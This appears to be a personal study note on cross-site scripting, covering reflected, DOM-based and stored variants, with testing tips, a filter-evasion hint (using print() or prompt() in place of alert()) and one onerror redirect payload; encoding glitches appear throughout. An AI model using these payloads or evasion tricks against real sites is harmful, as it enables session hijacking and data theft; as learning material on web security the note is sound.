# XXS (Cross site scripting)

Who: Attacker, Victim

What: Payload made of JavaScript

Where: Victimâ€™s browser, Web server

How: Victim click on malicious URL, page to trigger. Causing their session to be controlled or data to be stolen

Attacker execute JavaScript in the victimâ€™s browser, can give attackerâ€™s control over the application for that user.

Use `print()` `prompt("text")` instead of `alert()` since `alert()` is commonly detected and filtered.

When testing for XXS, test for html injection first because itâ€™s more likely to work
E.g., <h1>test</h1>

# Reflected

Inject payload into the HTTP request. And once the web server receive the request, it will response with the payload to senderâ€™s browser. It relies on URL to make user fall for the attack.

# Dom-Based

Client-side has vulnerable JavaScript. It doesnâ€™t involve with the server-side, completely rely on clientâ€™s browser to execute the payload.

One quick check is turn on the developer tool, and input simple prompt or alert script, see if thereâ€™s any network interaction with the server.

ðŸš¨

Inspecting Network page in the developer tab while sending input, thereâ€™s no external communication happens.

### Page Redirect

src=x onerror="window.location.href='<$url>'"

# Store

Payload is stored in the database, and victimâ€™s browser will retrieve it once it visit the page.

1. In the attackerâ€™s browser leave html injection comment: <h1>test</h1>.
2. Visit the same page from victimâ€™s browser
